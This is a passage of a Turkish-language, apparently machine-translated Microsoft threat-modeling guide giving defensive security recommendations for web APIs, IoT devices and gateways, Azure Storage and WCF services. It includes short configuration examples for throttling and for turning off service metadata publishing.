| Başlık                   | Ayrıntılar      |
| ----------------------- | ------------ |
| **Bileşen**               | Web API’si | 
| **SDL aşaması**               | Kurulum |  
| **İlgili teknolojiler** | Yorlar |
| **Özelliklerine**              | Yok  |
| **Başvur**              | [Nasıl yapılır: ASP.NET 2,0 ' de yapılandırma bölümlerini](https://msdn.microsoft.com/library/ff647398.aspx), [bir korumalı yapılandırma sağlayıcısı belirterek](https://msdn.microsoft.com/library/68ze1hb2.aspx), [uygulama gizli dizilerini korumak için Azure Key Vault kullanarak](https://azure.microsoft.com/documentation/articles/guidance-multitenant-identity-keyvault/) şifreleme |
| **Adımlar** | Web. config, appSettings. JSON gibi yapılandırma dosyaları genellikle kullanıcı adları, parolalar, veritabanı bağlantı dizeleri ve şifreleme anahtarları dahil olmak üzere hassas bilgileri tutmak için kullanılır. Bu bilgileri korumayın, uygulamanız saldırganların veya kötü niyetli kullanıcıların hesap Kullanıcı adları ve parolalar, veritabanı adları ve sunucu adları gibi hassas bilgileri elde etmesine açıktır. Dağıtım türüne (Azure/on-Prem) bağlı olarak, yapılandırma dosyalarının hassas bölümlerini, DPAPI veya Azure Key Vault gibi hizmetleri kullanarak şifreleyin. |

## <a id="admin-strong"></a>Tüm yönetici arabirimlerinin güçlü kimlik bilgileriyle güvenli olduğundan emin olun

| Başlık                   | Ayrıntılar      |
| ----------------------- | ------------ |
| **Bileşen**               | IoT cihazı | 
| **SDL aşaması**               | Kurulum |  
| **İlgili teknolojiler** | Yorlar |
| **Özelliklerine**              | Yok  |
| **Başvur**              | Yok  |
| **Adımlar** | Cihazın veya alan ağ geçidinin açığa çıkardığı tüm yönetim arabirimleri, güçlü kimlik bilgileri kullanılarak güvenli hale gelmelidir. Ayrıca, WiFi, SSH, dosya paylaşımları, FTP gibi diğer tüm sunulan arabirimler, güçlü kimlik bilgileriyle güvenli hale gelmelidir. Varsayılan zayıf parolalar kullanılmamalıdır. |

## <a id="unknown-exe"></a>Bilinmeyen kodun cihazlarda yürütülemez olduğundan emin olun

| Başlık                   | Ayrıntılar      |
| ----------------------- | ------------ |
| **Bileşen**               | IoT cihazı | 
| **SDL aşaması**               | Yapı |  
| **İlgili teknolojiler** | Yorlar |
| **Özelliklerine**              | Yok  |
| **Başvur**              | [Windows 10 IoT Core 'da güvenli önyükleme ve bit dolabı cihaz şifrelemesini etkinleştirme](https://docs.microsoft.com/windows/iot-core/secure-your-device/securebootandbitlocker) |
| **Adımlar** | UEFı güvenli önyükleme, sistemi yalnızca belirtilen bir yetkili tarafından imzalanan ikililerin yürütülmesine izin verecek şekilde kısıtlar. Bu özellik, platformda bilinmeyen kodun yürütülmesini ve potansiyel olarak weakening güvenlik durmasını önler. UEFı güvenli önyüklemeyi etkinleştirin ve kod imzalama için güvenilen sertifika yetkililerinin listesini kısıtlayın. Güvenilir yetkililerinden birini kullanarak cihaza dağıtılan tüm kodu imzalayın. |

## <a id="partition-iot"></a>Bit dolabı ile işletim sistemi ve IoT cihazının ek bölümlerini şifreleme

| Başlık                   | Ayrıntılar      |
| ----------------------- | ------------ |
| **Bileşen**               | IoT cihazı | 
| **SDL aşaması**               | Yapı |  
| **İlgili teknolojiler** | Yorlar |
| **Özelliklerine**              | Yok  |
| **Başvur**              | Yok  |
| **Adımlar** | Windows 10 IoT Core, gerekli ölçümleri destekleyen UEFı 'de gerekli olan preOS protokolü de dahil olmak üzere, platformda bir TPM 'nin varlığına yönelik güçlü bir bağımlılığı olan bit-dolabı cihaz şifrelemesinin hafif bir sürümünü uygular. Bu ön Işletim sistemi ölçümleri, işletim sisteminin daha sonra işletim sisteminin nasıl başlatılmakta olan kesin bir kaydına sahip olduğundan emin olun. Bit dolabı ve herhangi bir hassas veriyi depolarsa ek bölümleri kullanarak işletim sistemi bölümlerini şifreleyin. |

## <a id="min-enable"></a>Cihazlarda yalnızca en düşük hizmet/özelliklerin etkinleştirildiğinden emin olun

| Başlık                   | Ayrıntılar      |
| ----------------------- | ------------ |
| **Bileşen**               | IoT cihazı | 
| **SDL aşaması**               | Kurulum |  
| **İlgili teknolojiler** | Yorlar |
| **Özelliklerine**              | Yok  |
| **Başvur**              | Yok  |
| **Adımlar** | İşletim sisteminde çözümün çalışması için gerekli olmayan tüm özellikleri veya hizmetleri etkinleştirmeyin veya devre dışı bırakın. Örneğin, cihaz için bir UI dağıtımı gerektirmiyorsa, Windows IoT Core 'u gözetimsiz modda yüklersiniz. |

## <a id="field-bit-locker"></a>Bit dolabı ile işletim sistemi ve IoT alan ağ geçidinin ek bölümlerini şifreleme

| Başlık                   | Ayrıntılar      |
| ----------------------- | ------------ |
| **Bileşen**               | IoT alan ağ geçidi | 
| **SDL aşaması**               | Kurulum |  
| **İlgili teknolojiler** | Yorlar |
| **Özelliklerine**              | Yok  |
| **Başvur**              | Yok  |
| **Adımlar** | Windows 10 IoT Core, gerekli ölçümleri destekleyen UEFı 'de gerekli olan preOS protokolü de dahil olmak üzere, platformda bir TPM 'nin varlığına yönelik güçlü bir bağımlılığı olan bit-dolabı cihaz şifrelemesinin hafif bir sürümünü uygular. Bu ön Işletim sistemi ölçümleri, işletim sisteminin daha sonra işletim sisteminin nasıl başlatılmakta olan kesin bir kaydına sahip olduğundan emin olun. Bit dolabı ve herhangi bir hassas veriyi depolarsa ek bölümleri kullanarak işletim sistemi bölümlerini şifreleyin. |

## <a id="default-change"></a>Alan ağ geçidinin varsayılan oturum açma kimlik bilgilerinin yükleme sırasında değiştirildiğinden emin olun

| Başlık                   | Ayrıntılar      |
| ----------------------- | ------------ |
| **Bileşen**               | IoT alan ağ geçidi | 
| **SDL aşaması**               | Kurulum |  
| **İlgili teknolojiler** | Yorlar |
| **Özelliklerine**              | Yok  |
| **Başvur**              | Yok  |
| **Adımlar** | Alan ağ geçidinin varsayılan oturum açma kimlik bilgilerinin yükleme sırasında değiştirildiğinden emin olun |

## <a id="cloud-firmware"></a>Bulut ağ geçidinin bağlı cihazlar belleniminin güncel tutulması için bir işlem uyguladığından emin olun

| Başlık                   | Ayrıntılar      |
| ----------------------- | ------------ |
| **Bileşen**               | IoT bulut ağ geçidi | 
| **SDL aşaması**               | Yapı |  
| **İlgili teknolojiler** | Yorlar |
| **Özelliklerine**              | Ağ Geçidi seçimi-Azure IoT Hub |
| **Başvur**              | [Cihaz yönetimine genel bakış IoT Hub](https://azure.microsoft.com/documentation/articles/iot-hub-device-management-overview/) [cihaz üretici yazılımını güncelleştirme](../../iot-hub/tutorial-firmware-update.md) |
| **Adımlar** | LWM2M, IoT cihaz yönetimi için Open Mobile Alliance 'dan bir protokoldür. Azure IoT cihaz yönetimi, cihaz işlerini kullanarak fiziksel cihazlarla etkileşime geçmesini sağlar. Bulut ağ geçidinin, Azure IoT Hub cihaz yönetimi 'ni kullanarak cihazı ve diğer yapılandırma verilerini düzenli olarak güncel tutmasına yönelik bir işlem uyguladığından emin olun. |

## <a id="controls-policies"></a>Cihazların kuruluş ilkelerine göre yapılandırılmış uç nokta güvenlik denetimlerine sahip olduğundan emin olun

| Başlık                   | Ayrıntılar      |
| ----------------------- | ------------ |
| **Bileşen**               | Makine güven sınırı | 
| **SDL aşaması**               | Kurulum |  
| **İlgili teknolojiler** | Yorlar |
| **Özelliklerine**              | Yok  |
| **Başvur**              | Yok  |
| **Adımlar** | Cihazların disk düzeyinde şifreleme için bit-dolap gibi uç nokta güvenlik denetimlerine sahip olduğundan emin olun, güncelleştirilmiş imzalar ile virüsten koruma, ana bilgisayar tabanlı güvenlik duvarı, işletim sistemi yükseltmeleri, Grup ilkeleri vb., kuruluş güvenlik ilkelerine göre yapılandırılır. |

## <a id="secure-keys"></a>Azure depolama erişim anahtarlarının güvenli yönetimi sağlama

| Başlık                   | Ayrıntılar      |
| ----------------------- | ------------ |
| **Bileşen**               | Azure Depolama | 
| **SDL aşaması**               | Kurulum |  
| **İlgili teknolojiler** | Yorlar |
| **Özelliklerine**              | Yok  |
| **Başvur**              | [Azure depolama Güvenlik Kılavuzu-depolama hesabı anahtarlarınızı yönetme](https://azure.microsoft.com/documentation/articles/storage-security-guide/#_managing-your-storage-account-keys) |
| **Adımlar** | <p>Anahtar depolama: Azure depolama erişim anahtarlarını Azure Key Vault bir gizli dizi olarak depolamanız ve uygulamaların anahtar kasasından anahtarı alması önerilir. Aşağıdaki nedenlerden dolayı bu önerilir:</p><ul><li>Uygulamanın bir yapılandırma dosyasında depolama anahtarı sabit kodlanmış olmaz ve bu, başka bir kişinin belirli bir izni olmadan anahtarlara erişim elde etmeme özelliğini kaldırır</li><li>Anahtarlara erişim, Azure Active Directory kullanılarak denetlenebilir. Bu, bir hesap sahibinin Azure Key Vault anahtarları alması gereken el ile uygulamalara erişim sağlayabileceği anlamına gelir. Diğer uygulamalar özel olarak izin vermeden anahtarlara erişemeyecek</li><li>Anahtar yeniden oluşturma: güvenlik nedenleriyle Azure depolama erişim anahtarlarını yeniden oluşturmak için bir işlem yapmanız önerilir. Anahtar yeniden oluşturma planının neden ve nasıl planlanacağı hakkındaki ayrıntılar, Azure depolama Güvenlik Kılavuzu başvuru makalesinde belgelenmiştir</li></ul>|

## <a id="cors-storage"></a>CORS 'nin Azure depolamada etkin olması durumunda yalnızca güvenilir kaynaklardan izin verildiğinden emin olun

| Başlık                   | Ayrıntılar      |
| ----------------------- | ------------ |
| **Bileşen**               | Azure Depolama | 
| **SDL aşaması**               | Yapı |  
| **İlgili teknolojiler** | Yorlar |
| **Özelliklerine**              | Yok  |
| **Başvur**              | [Azure depolama hizmetleri için CORS desteği](https://msdn.microsoft.com/library/azure/dn535601.aspx) |
| **Adımlar** | Azure depolama, CORS-Cross-Origin kaynak paylaşımını etkinleştirmenizi sağlar. Her depolama hesabı için, bu depolama hesabındaki kaynaklara erişebilen etki alanlarını belirtebilirsiniz. Varsayılan olarak, CORS tüm hizmetlerde devre dışıdır. Hizmet ilkelerini ayarlamak için yöntemlerden birini çağırmak üzere REST API veya depolama istemci kitaplığını kullanarak CORS 'yi etkinleştirebilirsiniz. |

## <a id="throttling"></a>WCF 'nin hizmet azaltma özelliğini etkinleştir

| Başlık                   | Ayrıntılar      |
| ----------------------- | ------------ |
| **Bileşen**               | WCF | 
| **SDL aşaması**               | Yapı |  
| **İlgili teknolojiler** | .NET Framework 3 |
| **Özelliklerine**              | Yok  |
| **Başvur**              | [MSDN](https://msdn.microsoft.com/library/ff648500.aspx), [fortify Krallığı](https://vulncat.fortify.com) |
| **Adımlar** | <p>Sistem kaynaklarının kullanımı için bir sınır yerleştirmemeye, kaynak tükenmesi ve son olarak bir hizmet reddine neden olabilir.</p><ul><li>**Açıklama:** Windows Communication Foundation (WCF), hizmet isteklerini kısıtlama özelliği sunar. İstemci isteklerinin çok fazla olması, bir sistemi ve kaynaklarını tüketmesine izin verir. Öte yandan, bir hizmete yalnızca küçük sayıda isteğin izin verilmesi meşru kullanıcıların hizmeti kullanmasını engelleyebilir. Her hizmetin, uygun kaynak miktarına izin verecek şekilde ayrı ayrı ayarlanmış ve yapılandırılmış olması gerekir.</li><li>**Öneriler** WCF 'nin hizmet azaltma özelliğini etkinleştirin ve uygulamanız için uygun sınırları ayarlayın.</li></ul>|

### <a name="example"></a>Örnek
Aşağıda, azaltma etkin olan bir örnek yapılandırma verilmiştir:
```
<system.serviceModel> 
  <behaviors>
    <serviceBehaviors>
    <behavior name="Throttled">
    <serviceThrottling maxConcurrentCalls="[YOUR SERVICE VALUE]" maxConcurrentSessions="[YOUR SERVICE VALUE]" maxConcurrentInstances="[YOUR SERVICE VALUE]" /> 
  ...
</system.serviceModel> 
```

## <a id="info-metadata"></a>WCF-meta veriler aracılığıyla bilgilerin açıklanması

| Başlık                   | Ayrıntılar      |
| ----------------------- | ------------ |
| **Bileşen**               | WCF | 
| **SDL aşaması**               | Yapı |  
| **İlgili teknolojiler** | .NET Framework 3 |
| **Özelliklerine**              | Yok  |
| **Başvur**              | [MSDN](https://msdn.microsoft.com/library/ff648500.aspx), [fortify Krallığı](https://vulncat.fortify.com) |
| **Adımlar** | Meta veriler, saldırganların sistem hakkında bilgi edinme ve bir saldırı formu planı konusunda yardımcı olabilir. WCF Hizmetleri meta verileri açığa çıkarmak için yapılandırılabilir. Meta veriler ayrıntılı hizmet açıklaması bilgileri sağlar ve üretim ortamlarında yayınlanmamalıdır. ServiceMetaData sınıfının `HttpGetEnabled` / `HttpsGetEnabled` özellikleri, bir hizmetin meta verileri kullanıma sunmayacağını tanımlar | 

### <a name="example"></a>Örnek
Aşağıdaki kod, WCF 'nin bir hizmetin meta verilerini yayınmasını sağlar
```
ServiceMetadataBehavior smb = new ServiceMetadataBehavior();
smb.HttpGetEnabled = true; 
smb.HttpGetUrl = new Uri(EndPointAddress); 
Host.Description.Behaviors.Add(smb); 
```
Hizmet meta verilerini bir üretim ortamında yayımlamayın. ServiceMetaData sınıfının HttpGetEnabled/HttpsGetEnabled özelliklerini false olarak ayarlayın. 

### <a name="example"></a>Örnek
Aşağıdaki kod, WCF 'yi bir hizmetin meta verilerini yayınmamasını sağlar. 
```
ServiceMetadataBehavior smb = new ServiceMetadataBehavior(); 
smb.HttpGetEnabled = false; 
smb.HttpGetUrl = new Uri(EndPointAddress); 
Host.Description.Behaviors.Add(smb);
```
